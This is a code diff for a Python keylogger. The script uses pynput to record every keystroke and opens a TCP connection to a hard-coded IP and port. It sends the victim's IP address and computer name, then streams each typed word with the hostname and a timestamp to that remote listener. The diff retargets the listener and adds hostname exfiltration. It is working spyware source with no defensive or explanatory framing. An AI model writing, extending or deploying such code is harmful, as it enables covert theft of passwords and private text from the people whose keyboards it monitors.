@@ -1,8 +1,9 @@
 from pynput import keyboard
 import time
 import socket
-TCP_IP =  '10.23.200.84'
-TCP_PORT = 7878
+
+TCP_IP = '192.168.0.21'
+TCP_PORT = 9984
 BUFFER_SIZE = 124       
 v = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 v.connect(("8.8.8.8", 80))
@@ -13,11 +14,15 @@ client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((TCP_IP, TCP_PORT))  
 l="Connection is Up and Running"
 n = "You are connected to: "+ipAddr
+name = "Computer Name : "+socket.gethostname()
 client.send(l.encode())
+time.sleep(0.3)
+client.send(n.encode())
 time.sleep(0.3) 
-client.send(n.encode())     
-# data = client.recv(BUFFER_SIZE).decode()10.23.200.84       
-client.close()
+client.send(name.encode())     
+
+# data = client.recv(BUFFER_SIZE).decode()        
+client.close()	
 def on_release(key):    
     letter = key
     if letter == keyboard.Key.tab:
@@ -44,7 +49,8 @@ def log(key):
         time_string = time.strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
         word = ''.join(map(str, letters))
         word = word.replace("'","")
-        word = word+"  --  "+time_string
+        name = socket.gethostname()
+        word = word+"  --  "+name+"  --  "+time_string
         print(word) 
         client.send(word.encode())
         # print(client.send(word.encode()))
@@ -54,7 +60,7 @@ def log(key):
 
 with keyboard.Listener(
         on_press=log,
-        on_release=on_release
+        # on_release=on_release
         ) as listener:
     listener.join() 
     
